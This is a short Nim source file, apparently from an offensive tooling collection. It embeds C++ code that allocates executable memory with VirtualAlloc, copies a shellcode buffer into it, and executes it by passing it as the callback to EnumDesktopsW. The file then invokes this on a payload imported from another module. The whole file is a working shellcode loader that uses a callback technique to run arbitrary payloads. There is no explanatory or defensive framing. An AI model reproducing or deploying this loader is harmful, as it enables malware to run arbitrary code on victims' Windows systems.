import public

{.emit: """

int EnumDesktopWNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    ::EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)addr, NULL);
}
"""
.}

proc EnumDesktopWNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumDesktopWNim(@)",nodecl.}

discard EnumDesktopWNim(code,codelen)